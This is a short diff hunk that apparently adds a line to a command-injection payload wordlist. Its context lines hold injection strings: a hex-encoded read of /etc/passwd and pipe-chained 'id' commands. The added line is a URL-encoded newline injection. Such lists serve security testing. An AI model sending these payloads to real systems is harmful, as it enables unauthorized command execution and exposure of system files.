@@ -606,3 +606,4 @@ xxd -r -ps <(echo 2f6574632f706173737764)
 ||/usr/bin/id;
 ||/usr/bin/id|
 ||id
+%0Aadmin%201
